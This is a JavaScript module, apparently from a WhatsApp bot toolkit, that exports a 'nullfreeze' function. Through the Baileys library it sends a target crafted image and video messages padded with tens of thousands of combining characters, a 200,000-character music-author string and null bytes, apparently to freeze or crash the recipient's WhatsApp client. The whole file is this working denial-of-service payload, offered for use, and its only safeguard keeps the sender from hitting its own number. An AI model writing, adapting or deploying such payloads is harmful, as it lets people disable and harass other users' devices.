const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function nullfreeze(sock, target) {
    if (!sock || !target) {
        console.log('[nullfreeze] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never let the paired number target itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[nullfreeze] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    const msg = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mimetype: "image/jpeg",
                    caption: "!",
                    viewOnce: true,
                    contextInfo: {
                        quotedMessage: {
                            nativeFlowMessage: {
                                buttons: "\u0300".repeat(50000)
                            }
                        }
                    }
                }
            }
        }
    };

    try {
        await sock.relayMessage(target, msg, {
            participant: { jid: target }
        });
    } catch (e) {
        console.log('[nullfreeze img]', (e && e.message) ? e.message : e);
    }

    try {
        await sock.relayMessage(target, {
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                caption: "¿? XakaMods - Executive♦",
                fileSha256: "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
                fileLength: "175891",
                seconds: 1,
                mediaKey: "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
                height: 848,
                width: 480,
                fileEncSha256: "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
                directPath: "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
                mediaKeyTimestamp: "1765345955",
                streamingSidecar: "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
                annotations: [{
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "3312808138872179",
                            songId: "270259430421407",
                            author: "ြ".repeat(200000),
                            title: " XakaMods - Executive",
                            artworkDirectPath: "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
                            artworkSha256: "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
                            artworkEncSha256: "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
                            artistAttribution: "https://www.instagram.com/_u/carlos_10474",
                            countryBlocklist: "",
                            isExplicit: true,
                            artworkMediaKey: "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
                            musicSongStartTimeInMs: "10149",
                            derivedContentStartTimeInMs: "0",
                            overlapDurationInMs: "1000"
                        },
                        key: {
                            buttonsMesaage: {},
                            remoteJid: "628xxxx@s.whatsapp.net",
                            fromMe: true,
                            id: "ABC123XYZ",
                            extra1: "\u0000".repeat(555),
                            extra2: "\u0000",
                            extra3: "\u0000"
                        }
                    },
                    embeddedAction: true
                }]
            },
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        }, {
            noSelfSync: true
        });
    } catch (e) {
        console.log('[nullfreeze video]', (e && e.message) ? e.message : e);
    }
}

module.exports = { nullfreeze };
